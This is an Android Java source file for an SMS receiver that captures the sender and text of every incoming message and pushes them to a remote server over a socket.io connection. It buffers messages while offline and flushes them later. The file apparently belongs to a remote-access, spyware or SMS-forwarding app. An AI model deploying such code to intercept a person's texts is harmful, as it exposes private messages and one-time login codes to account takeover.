package com.fason.app.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.telephony.SmsMessage;
import android.util.Log;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import org.json.JSONObject;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import io.socket.client.Socket;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";
    private static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";
    private static final ExecutorService EXEC = Executors.newSingleThreadExecutor();

    private static final ExecutorService FLUSH_EXEC = Executors.newSingleThreadExecutor(r -> {
        Thread t = new Thread(r, "SmsFlush");
        t.setDaemon(true);
        return t;
    });
    private static final int MAX_BUFFER = 10;
    private static final List<JSONObject> buffer = new ArrayList<>();
    private static volatile boolean flushScheduled = false;

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || !SMS_RECEIVED_ACTION.equals(intent.getAction())) return;
        EXEC.execute(() -> {
            try {
                SmsMessage[] messages = parseMessages(intent);
                if (messages == null || messages.length == 0) return;
                Socket socket = SocketClient.getInstance().getSocket();
                boolean connected = socket != null && socket.connected();
                for (SmsMessage sms : messages) {
                    if (sms == null) continue;
                    String sender = sms.getDisplayOriginatingAddress();
                    String body = sms.getDisplayMessageBody();
                    if (sender == null || body == null) continue;
                    JSONObject payload = new JSONObject();
                    payload.put(Protocol.KEY_TYPE, "incoming");
                    payload.put(Protocol.KEY_SENDER, sender);
                    payload.put(Protocol.KEY_SMS_BODY, body);
                    payload.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                    if (connected) {
                        socket.emit(Protocol.SMS_PUSH, payload);
                    } else {
                        synchronized (buffer) {
                            if (buffer.size() >= MAX_BUFFER) {
                                buffer.remove(0);
                            }
                            buffer.add(payload);
                            Log.i(TAG, "Buffered SMS from " + sender + " (" + buffer.size() + "/" + MAX_BUFFER + ")");
                        }
                        scheduleFlush();
                    }
                }
            } catch (Exception e) {
                Log.w(TAG, "Failed to process incoming SMS", e);
            }
        });
    }

    private static void scheduleFlush() {
        if (flushScheduled) return;
        flushScheduled = true;
        FLUSH_EXEC.execute(() -> {
            try {
                while (true) {
                    Thread.sleep(10000);
                    Socket socket = SocketClient.getInstance().getSocket();
                    if (socket == null || !socket.connected()) continue;
                    synchronized (buffer) {
                        if (buffer.isEmpty()) break;
                        for (JSONObject payload : new ArrayList<>(buffer)) {
                            socket.emit(Protocol.SMS_PUSH, payload);
                        }
                        buffer.clear();
                        Log.i(TAG, "Flushed buffered SMS");
                    }
                    break;
                }
            } catch (InterruptedException ignored) {
            } catch (Exception e) {
                Log.w(TAG, "Flush failed", e);
            } finally {
                flushScheduled = false;
            }
        });
    }

    private SmsMessage[] parseMessages(Intent intent) {
        try {
            android.os.Bundle extras = intent.getExtras();
            if (extras == null) return null;
            Object[] pdus = (Object[]) extras.get("pdus");
            if (pdus == null || pdus.length == 0) return null;
            String format = extras.getString("format");
            SmsMessage[] messages = new SmsMessage[pdus.length];
            for (int i = 0; i < pdus.length; i++) {
                byte[] pdu = (byte[]) pdus[i];
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    messages[i] = SmsMessage.createFromPdu(pdu, format);
                } else {
                    messages[i] = SmsMessage.createFromPdu(pdu);
                }
            }
            return messages;
        } catch (Exception e) {
            return null;
        }
    }
}
